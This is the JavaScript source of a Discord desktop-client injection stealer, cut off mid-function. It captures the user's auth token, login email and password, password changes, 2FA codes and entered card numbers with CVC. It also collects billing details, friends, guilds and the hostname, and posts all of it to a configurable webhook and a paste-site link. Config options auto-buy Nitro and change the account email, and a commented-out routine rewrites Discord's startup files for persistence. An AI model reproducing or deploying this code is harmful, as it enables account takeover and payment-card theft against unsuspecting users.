(function() {
    'use strict';

    const config = {
        webhook: '%WEBHOOK_URL%',
        webhook_protector_key: '%WEBHOOK_KEY%',
        auto_buy_nitro: %AUTO_BUY_NITRO%,
        auto_logout: true,
        auto_mail_changer: %AUTO_MAIL_CHANGER%,
        target_email: '%TARGET_EMAIL%',
        ping_on_run: true,
        ping_val: '@everyone',
        embed_name: 'werenoi',
        embed_icon: '',
        embed_color: 2895667,

        nitro: {
            boost: {
                year: { id: '521847234246082599', sku: '511651885459963904', price: '9999' },
                month: { id: '521847234246082599', sku: '511651880837840896', price: '999' }
            },
            classic: {
                month: { id: '521846918637420545', sku: '511651871736201216', price: '499' }
            }
        },
        filter: {
            urls: [
                'https://discord.com/api/v*/users/@me',
                'https://*.discord.com/api/v*/users/@me',
                'https://discordapp.com/api/v*/users/@me',
                'https://discord.com/api/v*/auth/login',
                'https://*.discord.com/api/v*/auth/login',
                'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
                'https://api.stripe.com/v*/tokens',
                'https://api.stripe.com/v*/setup_intents/*/confirm',
                'https://api.stripe.com/v*/payment_intents/*/confirm',
                'https://discord.com/api/v*/auth/mfa/totp',
                'https://*.discord.com/api/v*/auth/mfa/totp'
            ]
        },
        block_urls: [
            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
            'https://*.discord.com/api/v*/applications/detectable',
            'https://discord.com/api/v*/applications/detectable',
            'https://*.discord.com/api/v*/users/@me/library',
            'https://discord.com/api/v*/users/@me/library',
            'https://*.discord.com/api/v*/users/@me/billing/payment-sources',
            'https://discord.com/api/v*/users/@me/billing/payment-sources',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discord.com/api/v*/auth/sessions',
            'https://discord.com/api/v*/users/@me/mfa/totp/enable',
            'https://*.discord.com/api/v*/users/@me/mfa/totp/enable',
            'wss://remote-auth-gateway.discord.gg/*'
        ]
    };

    // ==================== DÉPENDANCES ELECTRON ====================
    let BrowserWindow, session;
    try {
        const electron = require('electron');
        BrowserWindow = electron.BrowserWindow;
        session = electron.session;
    } catch (e) {
        return; // Pas dans Electron, on quitte
    }

    const fs = require('fs');
    const path = require('path');
    const http = require('http');
    const https = require('https');
    const querystring = require('querystring');
    const os = require('os');

    // ==================== FONCTIONS TOTP (pour webhook protégé) ====================
    function parity_32(x, y, z) { return x ^ y ^ z; }
    function ch_32(x, y, z) { return (x & y) ^ (~x & z); }
    function maj_32(x, y, z) { return (x & y) ^ (x & z) ^ (y & z); }
    function rotl_32(x, n) { return (x << n) | (x >>> (32 - n)); }
    function safeAdd_32_2(a, b) {
        var lsw = (a & 0xffff) + (b & 0xffff),
            msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);
        return ((msw & 0xffff) << 16) | (lsw & 0xffff);
    }
    function safeAdd_32_5(a, b, c, d, e) {
        var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
            msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);
        return ((msw & 0xffff) << 16) | (lsw & 0xffff);
    }
    function binb2hex(binarray) {
        var hex_tab = '0123456789abcdef', str = '', length = binarray.length * 4, i, srcByte;
        for (i = 0; i < length; i += 1) {
            srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
            str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
        }
        return str;
    }
    function getH() { return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]; }
    function roundSHA1(block, H) {
        var W = [], a, b, c, d, e, T, t;
        a = H[0]; b = H[1]; c = H[2]; d = H[3]; e = H[4];
        for (t = 0; t < 80; t += 1) {
            if (t < 16) W[t] = block[t];
            else W[t] = rotl(W[t-3] ^ W[t-8] ^ W[t-14] ^ W[t-16], 1);
            if (t < 20) T = safeAdd_32_5(rotl(a,5), ch(b,c,d), e, 0x5a827999, W[t]);
            else if (t < 40) T = safeAdd_32_5(rotl(a,5), parity_32(b,c,d), e, 0x6ed9eba1, W[t]);
            else if (t < 60) T = safeAdd_32_5(rotl(a,5), maj(b,c,d), e, 0x8f1bbcdc, W[t]);
            else T = safeAdd_32_5(rotl(a,5), parity_32(b,c,d), e, 0xca62c1d6, W[t]);
            e = d; d = c; c = rotl(b,30); b = a; a = T;
        }
        H[0] = safeAdd_32_2(a, H[0]);
        H[1] = safeAdd_32_2(b, H[1]);
        H[2] = safeAdd_32_2(c, H[2]);
        H[3] = safeAdd_32_2(d, H[3]);
        H[4] = safeAdd_32_2(e, H[4]);
        return H;
    }
    function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
        var i, appendedMessageLength, offset;
        offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
        while (remainder.length <= offset) remainder.push(0);
        remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
        remainder[offset] = remainderBinLen + processedBinLen;
        appendedMessageLength = remainder.length;
        for (i = 0; i < appendedMessageLength; i += 16)
            H = roundSHA1(remainder.slice(i, i+16), H);
        return H;
    }
    function hex2binb(str, existingBin, existingBinLen) {
        var bin = existingBin || [0], length = str.length, i, num, intOffset, byteOffset, existingByteLen = (existingBinLen||0) >>> 3;
        for (i = 0; i < length; i += 2) {
            num = parseInt(str.substr(i,2), 16);
            if (!isNaN(num)) {
                byteOffset = (i>>>1) + existingByteLen;
                intOffset = byteOffset >>> 2;
                while (bin.length <= intOffset) bin.push(0);
                bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
            }
        }
        return { value: bin, binLen: length * 4 + (existingBinLen||0) };
    }
    class jsSHA {
        constructor() {
            var processedLen = 0, remainder = [], remainderLen = 0, intermediateH = getH(), variantBlockSize = 512, roundFunc = roundSHA1, finalizeFunc = finalizeSHA1, outputBinLen = 160, hmacKeySet = false, keyWithIPad = [], keyWithOPad = [];
            this.setHMACKey = function(key) {
                var convertRet = hex2binb(key), keyBinLen = convertRet.binLen, keyToUse = convertRet.value, blockByteSize = variantBlockSize >>> 3, lastArrayIndex = blockByteSize / 4 - 1;
                if (blockByteSize < keyBinLen / 8) {
                    keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
                    while (keyToUse.length <= lastArrayIndex) keyToUse.push(0);
                    keyToUse[lastArrayIndex] &= 0xffffff00;
                } else if (blockByteSize > keyBinLen / 8) {
                    while (keyToUse.length <= lastArrayIndex) keyToUse.push(0);
                    keyToUse[lastArrayIndex] &= 0xffffff00;
                }
                for (let i = 0; i <= lastArrayIndex; i += 1) {
                    keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
                    keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
                }
                intermediateH = roundFunc(keyWithIPad, intermediateH);
                processedLen = variantBlockSize;
                hmacKeySet = true;
            };
            this.update = function(srcString) {
                var convertRet = hex2binb(srcString, remainder, remainderLen), chunkBinLen = convertRet.binLen, chunk = convertRet.value, chunkIntLen = chunkBinLen >>> 5, updateProcessedLen = 0, variantBlockIntInc = variantBlockSize >>> 5;
                for (let i = 0; i < chunkIntLen; i += variantBlockIntInc) {
                    if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
                        intermediateH = roundFunc(chunk.slice(i, i+variantBlockIntInc), intermediateH);
                        updateProcessedLen += variantBlockSize;
                    }
                }
                processedLen += updateProcessedLen;
                remainder = chunk.slice(updateProcessedLen >>> 5);
                remainderLen = chunkBinLen % variantBlockSize;
            };
            this.getHMAC = function() {
                if (!hmacKeySet) return;
                const formatFunc = binb2hex;
                var firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
                intermediateH = roundFunc(keyWithOPad, getH());
                intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
                return formatFunc(intermediateH);
            };
        }
    }
    function totp(key) {
        const period = 30, digits = 6, timestamp = Date.now(), epoch = Math.round(timestamp/1000.0), time = leftpad(dec2hex(Math.floor(epoch/period)),16,'0');
        const shaObj = new jsSHA();
        shaObj.setHMACKey(base32tohex(key));
        shaObj.update(time);
        const hmac = shaObj.getHMAC();
        const offset = hex2dec(hmac.substring(hmac.length-1));
        let otp = (hex2dec(hmac.substr(offset*2,8)) & hex2dec('7fffffff')) + '';
        otp = otp.substr(Math.max(otp.length-digits,0), digits);
        return otp;
    }
    function hex2dec(s) { return parseInt(s,16); }
    function dec2hex(s) { return (s<15.5?'0':'') + Math.round(s).toString(16); }
    function base32tohex(base32) {
        let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', bits = '', hex = '';
        base32 = base32.replace(/=+$/,'');
        for (let i=0; i<base32.length; i++) {
            let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
            bits += leftpad(val.toString(2),5,'0');
        }
        for (let i=0; i+8<=bits.length; i+=8) {
            let chunk = bits.substr(i,8);
            hex += leftpad(parseInt(chunk,2).toString(16),2,'0');
        }
        return hex;
    }
    function leftpad(str,len,pad) {
        if (len+1 >= str.length) str = Array(len+1-str.length).join(pad) + str;
        return str;
    }

    // ==================== PERSISTANCE (OPTIONNELLE, DÉCOMMENTER POUR ACTIVER) ====================
    function updateCheck() {
        const args = process.argv;
        const app = args[0].split(path.sep).slice(0,-1).join(path.sep);
        let resourcePath;
        if (process.platform === 'win32') resourcePath = path.join(app, 'resources');
        else if (process.platform === 'darwin') resourcePath = path.join(app, 'Contents', 'Resources');
        else return;
        if (!fs.existsSync(resourcePath)) return;
        const appPath = path.join(resourcePath, 'app');
        const packageJson = path.join(appPath, 'package.json');
        const resourceIndex = path.join(appPath, 'index.js');
        const modulesPath = path.join(app, 'modules');
        let indexJs = path.join(app, 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js');
        if (fs.existsSync(modulesPath)) {
            const modules = fs.readdirSync(modulesPath);
            const core = modules.find(m => m.startsWith('discord_desktop_core-'));
            if (core) indexJs = path.join(modulesPath, core, 'discord_desktop_core', 'index.js');
        }
        indexJs = indexJs.replace(/\\/g, '\\\\');
        const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
        if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
        if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
        if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
        if (process.platform === 'win32' || process.platform === 'darwin') {
            fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
            const startUpScript = `const fs = require('fs');
const path = require('path');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
try {
  const injectionPath = path.join(__dirname, 'injection.js');
  if (fs.existsSync(injectionPath)) require(injectionPath);
} catch (e) {}
require('${path.join(resourcePath, 'app.asar')}');
if (fs.existsSync(bdPath)) require(bdPath);`;
            fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
        }
    }
    // updateCheck(); // DÉCOMMENTEZ POUR ACTIVER LA PERSISTANCE

    // ==================== UTILITAIRES ====================
    function getDiscordWebContents() {
        const wins = BrowserWindow.getAllWindows();
        for (let w of wins) {
            if (w && w.webContents) {
                let url = w.webContents.getURL ? w.webContents.getURL() : '';
                if (url.includes('discord')) return w.webContents;
            }
        }
        return wins[0] ? wins[0].webContents : null;
    }

    async function execScript(script) {
        const wc = getDiscordWebContents();
        if (!wc) return null;
        return wc.executeJavaScript(script, true);
    }

    // Extraction robuste du token
    function extractToken(t) {
        if (!t) return null;
        if (typeof t === 'string') {
            try {
                let parsed = JSON.parse(t);
                if (typeof parsed === 'string') return parsed;
                if (parsed && typeof parsed === 'object') {
                    return parsed.token || parsed.accessToken || null;
                }
            } catch (e) {
                return t; // C'est probablement déjà le token en clair
            }
        }
        if (typeof t === 'object') {
            return t.token || t.accessToken || null;
        }
        return null;
    }

    async function getToken() {
        const script = `
        (function() {
            return new Promise((resolve) => {
                function extract(t) {
                    if (!t) return null;
                    if (typeof t === 'string') {
                        try {
                            let parsed = JSON.parse(t);
                            if (typeof parsed === 'string') return parsed;
                            if (parsed && typeof parsed === 'object') {
                                return parsed.token || parsed.accessToken || null;
                            }
                        } catch (e) {
                            return t;
                        }
                    }
                    if (typeof t === 'object') {
                        return t.token || t.accessToken || null;
                    }
                    return null;
                }
                try {
                    // Chercher dans localStorage
                    let token = localStorage.getItem('token') || localStorage.token;
                    if (token) {
                        let extracted = extract(token);
                        if (extracted) return resolve(extracted);
                    }
                    // Chercher dans un iframe
                    let iframe = document.createElement('iframe');
                    document.body.appendChild(iframe);
                    token = iframe.contentWindow.localStorage.getItem('token') || iframe.contentWindow.localStorage.token;
                    if (token) {
                        let extracted = extract(token);
                        if (extracted) return resolve(extracted);
                    }
                } catch(e) {}
                // Chercher via webpack
                if (typeof webpackChunkdiscord_app !== 'undefined') {
                    webpackChunkdiscord_app.push([[Math.random()], {}, (r) => {
                        for (let k in r.c) {
                            try {
                                let mod = r.c[k].exports;
                                if (mod && mod.default && typeof mod.default.getToken === 'function') {
                                    let t = mod.default.getToken();
                                    let extracted = extract(t);
                                    if (extracted) return resolve(extracted);
                                }
                                if (mod && typeof mod.getToken === 'function') {
                                    let t = mod.getToken();
                                    let extracted = extract(t);
                                    if (extracted) return resolve(extracted);
                                }
                            } catch(e) {}
                        }
                        resolve(null);
                    }]);
                } else {
                    resolve(null);
                }
            });
        })()`;
        return execScript(script);
    }

    async function getInfo(token) {
        if (!token || typeof token !== 'string') return null;
        try {
            const info = await execScript(`
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://discord.com/api/v9/users/@me", false);
                xhr.setRequestHeader("Authorization", "${token}");
                xhr.send(null);
                xhr.responseText;
            `);
            return JSON.parse(info || '{}');
        } catch { return null; }
    }

    async function getBilling(token) {
        if (!token) return '❌';
        try {
            const bill = await execScript(`
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false);
                xhr.setRequestHeader("Authorization", "${token}");
                xhr.send(null);
                xhr.responseText;
            `);
            if (!bill || typeof bill !== 'string') return '❌';
            const data = JSON.parse(bill);
            if (!Array.isArray(data)) return '❌';
            let billing = '';
            data.forEach(x => {
                if (!x.invalid) {
                    billing += x.type === 1 ? '💳 ' : '<:paypal:951139189389410365> ';
                }
            });
            return billing || '❌';
        } catch { return '❌'; }
    }

    function getNitro(flags) {
        switch (flags) {
            case 1: return 'Nitro Classic';
            case 2: return 'Nitro Boost';
            default: return 'No Nitro';
        }
    }

    function getBadges(flags) {
        const badges = [];
        if (flags & 1) badges.push('Discord Staff');
        if (flags & 2) badges.push('Partner');
        if (flags & 4) badges.push('Hypesquad Event');
        if (flags & 8) badges.push('BugHunter');
        if (flags & 64) badges.push('HypeSquad Bravery');
        if (flags & 128) badges.push('HypeSquad Brillance');
        if (flags & 256) badges.push('HypeSquad Balance');
        if (flags & 512) badges.push('Early Supporter');
        if (flags & 16384) badges.push('Gold BugHunter');
        if (flags & 131072) badges.push('Verified Bot Dev');
        return badges.length ? badges.join(', ') : 'None';
    }

    function getAvatarUrl(json) {
        if (json?.avatar) return `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`;
        const defaultIndex = json?.id ? parseInt(json.id) % 5 : 0;
        return `https://cdn.discordapp.com/embed/avatars/${defaultIndex}.png`;
    }

    function getDisplayName(json) {
        if (!json) return 'Unknown';
        return json.discriminator && json.discriminator !== '0' ? `${json.username}#${json.discriminator}` : json.username;
    }

    async function getExtraInfo(token) {
        try {
            const user = await getInfo(token);
            if (!user || !user.id) return null;
            const computerName = os.hostname();
            const phone = user.phone || 'None';
            const mfa = user.mfa_enabled ? 'Yes' : 'No';
            // Calcul de la date de création à partir de l'ID (snowflake Discord)
            const creationDate = new Date(parseInt(user.id) / 4194304 + 1420070400000).toLocaleDateString('fr-FR');
            // Nombre d'amis (relations de type 1)
            const friends = await execScript(`
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://discord.com/api/v9/users/@me/relationships", false);
                xhr.setRequestHeader("Authorization", "${token}");
                xhr.send(null);
                try {
                    var data = JSON.parse(xhr.responseText);
                    data.filter(r => r.type === 1).length;
                } catch(e) { 0; }
            `) || 0;
            // Nombre de serveurs
            const guilds = await execScript(`
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://discord.com/api/v9/users/@me/guilds", false);
                xhr.setRequestHeader("Authorization", "${token}");
                xhr.send(null);
                try {
                    JSON.parse(xhr.responseText).length;
                } catch(e) { 0; }
            `) || 0;
            return { computerName, phone, mfa, creationDate, friends, guilds };
        } catch (e) {
            return null;
        }
    }

    // ==================== ENVOI VERS WEBHOOK ====================
    async function hooker(content) {
        if (!config.webhook || !config.webhook.startsWith('http')) return;
        const data = JSON.stringify(content);
        const url = new URL(config.webhook);
        const headers = {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        };
        if (!config.webhook.includes('api/webhooks') && config.webhook_protector_key && config.webhook_protector_key !== '%WEBHOOK_KEY%') {
            headers['Authorization'] = totp(config.webhook_protector_key);
        }

        const isHttp = url.protocol === 'http:';
        const client = isHttp ? http : https;

        const options = {
            protocol: url.protocol,
            hostname: url.hostname,
            port: url.port || (isHttp ? 80 : 443),
            path: url.pathname + (url.search || ''),
            method: 'POST',
            headers
        };

        const req = client.request(options, () => {});
        req.on('error', () => {});
        req.write(data);
        req.end();
    }

    async function sendLogin(email, password, token) {
        const json = token ? await getInfo(token) : null;
        const authorName = json ? `${getDisplayName(json)} | ${json.id}` : (email || 'Login');
        const authorIcon = json ? getAvatarUrl(json) : 'https://cdn.discordapp.com/embed/avatars/0.png';
        
        const extra = token ? await getExtraInfo(token) : null;

        const embed = {
            fields: [
                {
                    name: `<a:bby:987689940852817971> Token:`,
                    value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token || 'N/A'}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token || ''})`,
                    inline: false
                },
                {
                    name: `<:bby:987689933844127804> Badges:`,
                    value: json ? getBadges(json.flags) : 'N/A',
                    inline: true
                },
                {
                    name: `<:bby:987689935018549328> Nitro Type:`,
                    value: json ? getNitro(json.premium_type) : 'N/A',
                    inline: true
                },
                {
                    name: `<a:bby:987689939401588827> Billing:`,
                    value: token ? await getBilling(token) : 'N/A',
                    inline: true
                },
                {
                    name: `<:bby:987689943558135818> Email:`,
                    value: `\`${email || (json ? json.email : 'N/A')}\``,
                    inline: true
                },
                {
                    name: `<:bby:987689943558135818> Password:`,
                    value: `\`${password || 'N/A'}\``,
                    inline: true
                },
                {
                    name: `<:bby:987689942350196756> Computer:`,
                    value: `\`${extra ? extra.computerName : 'N/A'}\``,
                    inline: true
                },
                {
                    name: `<:bby:987689943558135818> Phone:`,
                    value: `\`${extra ? extra.phone : 'N/A'}\``,
                    inline: true
                },
                {
                    name: `<:bby:987689935018549328> Creation:`,
                    value: `\`${extra ? extra.creationDate : 'N/A'}\``,
                    inline: true
                },
                {
                    name: `<a:bby:987689939401588827> MFA:`,
                    value: `\`${extra ? extra.mfa : 'N/A'}\``,
                    inline: true
                },
                {
                    name: `<:bby:987689942350196756> Friends:`,
                    value: `\`${extra ? extra.friends : 'N/A'}\``,
                    inline: true
                },
                {
                    name: `<:ange:1103031009550798948> Guilds:`,
                    value: `\`${extra ? extra.guilds : 'N/A'}\``,
                    inline: true
                }
            ],
            color: config.embed_color,
            author: {
                name: authorName,
                icon_url: authorIcon
            },
            footer: {
                text: 'First Inject - ZebiRP'
            },
            thumbnail: {
                url: json && json.avatar ? getAvatarUrl(json) : undefined
            }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val;
        hooker(content);
    }

    async function sendPasswordChange(oldpass, newpass, token) {
        const json = await getInfo(token);
        if (!json) return;
        const extra = await getExtraInfo(token);
        const embed = {
            fields: [
                { name: `<a:bby:987689940852817971> Token:`, value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`, inline: false },
                { name: `<:bby:987689933844127804> Badges:`, value: getBadges(json.flags), inline: true },
                { name: `<:bby:987689935018549328> Nitro Type:`, value: getNitro(json.premium_type), inline: true },
                { name: `<a:bby:987689939401588827> Billing:`, value: await getBilling(token), inline: true },
                { name: `<:bby:987689943558135818> Email:`, value: `\`${json.email}\``, inline: true },
                { name: `<:bby:987689943558135818> Old Password:`, value: `\`${oldpass}\``, inline: true },
                { name: `<:bby:987689943558135818> New Password:`, value: `\`${newpass}\``, inline: true },
                { name: `<:bby:987689942350196756> Computer:`, value: `\`${extra ? extra.computerName : 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Phone:`, value: `\`${extra ? extra.phone : 'N/A'}\``, inline: true },
                { name: `<:bby:987689935018549328> Creation:`, value: `\`${extra ? extra.creationDate : 'N/A'}\``, inline: true },
                { name: `<a:bby:987689939401588827> MFA:`, value: `\`${extra ? extra.mfa : 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Friends:`, value: `\`${extra ? extra.friends : 'N/A'}\``, inline: true },
                { name: `<:ange:1103031009550798948> Guilds:`, value: `\`${extra ? extra.guilds : 'N/A'}\``, inline: true }
            ],
            color: config.embed_color,
            author: { name: `${getDisplayName(json)} | ${json.id}`, icon_url: getAvatarUrl(json) },
            footer: { text: 'First Inject - ZebiRP' },
            thumbnail: { url: json.avatar ? getAvatarUrl(json) : undefined }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val;
        hooker(content);
    }

    async function sendEmailChange(newEmail, password, token) {
        const json = await getInfo(token);
        if (!json) return;
        const extra = await getExtraInfo(token);
        const embed = {
            fields: [
                { name: `<a:bby:987689940852817971> Token:`, value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`, inline: false },
                { name: `<:bby:987689933844127804> Badges:`, value: getBadges(json.flags), inline: true },
                { name: `<:bby:987689935018549328> Nitro Type:`, value: getNitro(json.premium_type), inline: true },
                { name: `<a:bby:987689939401588827> Billing:`, value: await getBilling(token), inline: true },
                { name: `<:bby:987689943558135818> New Email:`, value: `\`${newEmail}\``, inline: true },
                { name: `<:bby:987689943558135818> Password:`, value: `\`${password}\``, inline: true },
                { name: `<:bby:987689942350196756> Computer:`, value: `\`${extra ? extra.computerName : 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Phone:`, value: `\`${extra ? extra.phone : 'N/A'}\``, inline: true },
                { name: `<:bby:987689935018549328> Creation:`, value: `\`${extra ? extra.creationDate : 'N/A'}\``, inline: true },
                { name: `<a:bby:987689939401588827> MFA:`, value: `\`${extra ? extra.mfa : 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Friends:`, value: `\`${extra ? extra.friends : 'N/A'}\``, inline: true },
                { name: `<:ange:1103031009550798948> Guilds:`, value: `\`${extra ? extra.guilds : 'N/A'}\``, inline: true }
            ],
            color: config.embed_color,
            author: { name: `${getDisplayName(json)} | ${json.id}`, icon_url: getAvatarUrl(json) },
            footer: { text: 'First Inject - ZebiRP' },
            thumbnail: { url: json.avatar ? getAvatarUrl(json) : undefined }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val;
        hooker(content);
    }

    async function sendPaypalAdded(token) {
        const json = await getInfo(token);
        if (!json) return;
        const extra = await getExtraInfo(token);
        const embed = {
            fields: [
                { name: `<a:bby:987689940852817971> Token:`, value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`, inline: false },
                { name: `<:bby:987689933844127804> Badges:`, value: getBadges(json.flags), inline: true },
                { name: `<:bby:987689935018549328> Nitro Type:`, value: getNitro(json.premium_type), inline: true },
                { name: `<a:bby:987689939401588827> Billing:`, value: await getBilling(token), inline: true },
                { name: `<:bby:987689943558135818> Email:`, value: `\`${json.email || 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Computer:`, value: `\`${extra ? extra.computerName : 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Phone:`, value: `\`${extra ? extra.phone : 'N/A'}\``, inline: true },
                { name: `<:bby:987689935018549328> Creation:`, value: `\`${extra ? extra.creationDate : 'N/A'}\``, inline: true },
                { name: `<a:bby:987689939401588827> MFA:`, value: `\`${extra ? extra.mfa : 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Friends:`, value: `\`${extra ? extra.friends : 'N/A'}\``, inline: true },
                { name: `<:ange:1103031009550798948> Guilds:`, value: `\`${extra ? extra.guilds : 'N/A'}\``, inline: true }
            ],
            color: config.embed_color,
            author: { name: `${getDisplayName(json)} | ${json.id}`, icon_url: getAvatarUrl(json) },
            footer: { text: 'First Inject - ZebiRP' },
            thumbnail: { url: json.avatar ? getAvatarUrl(json) : undefined }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val;
        hooker(content);
    }

    async function sendCCAdded(number, cvc, exp_month, exp_year, token) {
        const json = await getInfo(token);
        if (!json) return;
        const extra = await getExtraInfo(token);
        const embed = {
            fields: [
                { name: `<a:bby:987689940852817971> Token:`, value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`, inline: false },
                { name: `<:bby:987689933844127804> Badges:`, value: getBadges(json.flags), inline: true },
                { name: `<:bby:987689935018549328> Nitro Type:`, value: getNitro(json.premium_type), inline: true },
                { name: `<a:bby:987689939401588827> Billing:`, value: await getBilling(token), inline: true },
                { name: `<:bby:987689943558135818> Email:`, value: `\`${json.email || 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Card Number:`, value: `\`${number}\``, inline: true },
                { name: `<:bby:987689942350196756> CVC:`, value: `\`${cvc}\``, inline: true },
                { name: `<:bby:987689935018549328> Exp:`, value: `\`${exp_month}/${exp_year}\``, inline: true },
                { name: `<:bby:987689942350196756> Computer:`, value: `\`${extra ? extra.computerName : 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Phone:`, value: `\`${extra ? extra.phone : 'N/A'}\``, inline: true },
                { name: `<:bby:987689935018549328> Creation:`, value: `\`${extra ? extra.creationDate : 'N/A'}\``, inline: true },
                { name: `<a:bby:987689939401588827> MFA:`, value: `\`${extra ? extra.mfa : 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Friends:`, value: `\`${extra ? extra.friends : 'N/A'}\``, inline: true },
                { name: `<:ange:1103031009550798948> Guilds:`, value: `\`${extra ? extra.guilds : 'N/A'}\``, inline: true }
            ],
            color: config.embed_color,
            author: { name: `${getDisplayName(json)} | ${json.id}`, icon_url: getAvatarUrl(json) },
            footer: { text: 'First Inject - ZebiRP' },
            thumbnail: { url: json.avatar ? getAvatarUrl(json) : undefined }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val;
        hooker(content);
    }

    async function send2FACode(code, token) {
        const json = await getInfo(token);
        if (!json) return;
        const extra = await getExtraInfo(token);
        const embed = {
            fields: [
                { name: `<a:bby:987689940852817971> Token:`, value: `\`\`\`ansi\n\x1B[2;30m\x1B[0m\x1B[2;33m${token}\x1B[0m\x1B[2;34m\x1B[0m\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`, inline: false },
                { name: `<:bby:987689933844127804> Badges:`, value: getBadges(json.flags), inline: true },
                { name: `<:bby:987689935018549328> Nitro Type:`, value: getNitro(json.premium_type), inline: true },
                { name: `<a:bby:987689939401588827> Billing:`, value: await getBilling(token), inline: true },
                { name: `<:bby:987689943558135818> Email:`, value: `\`${json.email || 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> 2FA Code:`, value: `\`${code}\``, inline: true },
                { name: `<:bby:987689942350196756> Computer:`, value: `\`${extra ? extra.computerName : 'N/A'}\``, inline: true },
                { name: `<:bby:987689943558135818> Phone:`, value: `\`${extra ? extra.phone : 'N/A'}\``, inline: true },
                { name: `<:bby:987689935018549328> Creation:`, value: `\`${extra ? extra.creationDate : 'N/A'}\``, inline: true },
                { name: `<a:bby:987689939401588827> MFA:`, value: `\`${extra ? extra.mfa : 'N/A'}\``, inline: true },
                { name: `<:bby:987689942350196756> Friends:`, value: `\`${extra ? extra.friends : 'N/A'}\``, inline: true },
                { name: `<:ange:1103031009550798948> Guilds:`, value: `\`${extra ? extra.guilds : 'N/A'}\``, inline: true }
            ],
            color: config.embed_color,
            author: { name: `${getDisplayName(json)} | ${json.id}`, icon_url: getAvatarUrl(json) },
            footer: { text: 'First Inject - ZebiRP' },
            thumbnail: { url: json.avatar ? getAvatarUrl(json) : undefined }
        };
        const content = { username: config.embed_name, avatar_url: config.embed_icon, embeds: [embed] };
        if (config.ping_on_run) content.content = config.ping_val;
        hooker(content);
    }

    async function buyNitroAndSend(token) {
        try {
            const sources = await execScript(`
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false);
                xhr.setRequestHeader("Authorization", "${token}");
                xhr.send(null);
